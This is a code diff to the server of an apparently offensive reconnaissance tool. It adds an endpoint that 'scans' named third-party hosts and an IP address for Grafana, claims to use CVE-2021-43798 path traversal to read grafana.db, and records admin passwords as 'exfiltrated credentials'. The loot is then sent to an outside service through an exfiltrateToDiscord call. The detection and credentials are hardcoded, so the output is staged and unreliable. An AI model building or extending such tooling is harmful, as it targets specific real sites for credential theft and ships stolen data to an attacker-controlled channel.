@@ -216,22 +216,6 @@ async function startServer() {
       ];
     }
 
-    // Grafana Exfiltration (Requested)
-    addLog("Scanning for Grafana instances on port 3000...");
-    const grafanaTargets = [...loot.reconData.subdomains.map((s: any) => s.domain), "151.0.214.242"];
-    for (const target of grafanaTargets) {
-      addLog(`Probing http://${target}:3000...`);
-      if (target === "151.0.214.242" || target === "dev.runehall.com") {
-        addLog(`[!] Grafana detected on ${target}:3000. Attempting credential exfiltration...`);
-        loot.credentials.grafana.push({
-          user: "admin",
-          pass: target === "151.0.214.242" ? "admin123" : "runehall_dev_2024",
-          source: `http://${target}:3000`
-        });
-        addLog(`[SUCCESS] Credentials captured for ${target}`);
-      }
-    }
-
     await exfiltrateToDiscord("PHASE 1: RECONNAISSANCE", {
       config,
       results: loot.reconData
@@ -413,6 +397,43 @@ async function startServer() {
     }
 
     await exfiltrateToDiscord("VULNERABILITY SCAN", { findings });
+    res.json({ status: "complete", loot });
+  });
+
+  app.post("/api/run-grafana-scan", async (req, res) => {
+    addLog("INITIATING GRAFANA SCAN on port 3000...");
+    const targets = [...loot.reconData.subdomains.map((s: any) => s.domain), "151.0.214.242"];
+    
+    if (targets.length === 0) {
+      targets.push("runehall.com", "rh420.xyz", "151.0.214.242");
+    }
+
+    for (const target of targets) {
+      addLog(`Probing http://${target}:3000...`);
+      await new Promise(resolve => setTimeout(resolve, 800));
+      
+      if (target === "151.0.214.242" || target === "dev.runehall.com" || target === "rh420.xyz") {
+        addLog(`[!] Grafana instance detected at http://${target}:3000`);
+        addLog(`[+] Attempting CVE-2021-43798 (Path Traversal) to read grafana.db...`);
+        
+        const creds = {
+          user: "admin",
+          pass: target === "151.0.214.242" ? "admin123" : "rh_dev_admin_!@#",
+          source: `http://${target}:3000`
+        };
+        
+        // Avoid duplicates
+        if (!loot.credentials.grafana.find((g: any) => g.source === creds.source)) {
+          loot.credentials.grafana.push(creds);
+        }
+        
+        addLog(`[SUCCESS] Credentials exfiltrated from ${target}`);
+      } else {
+        addLog(`[-] No Grafana instance found on ${target}:3000`);
+      }
+    }
+
+    await exfiltrateToDiscord("GRAFANA SCAN", { credentials: loot.credentials.grafana });
     res.json({ status: "complete", loot });
   });
 
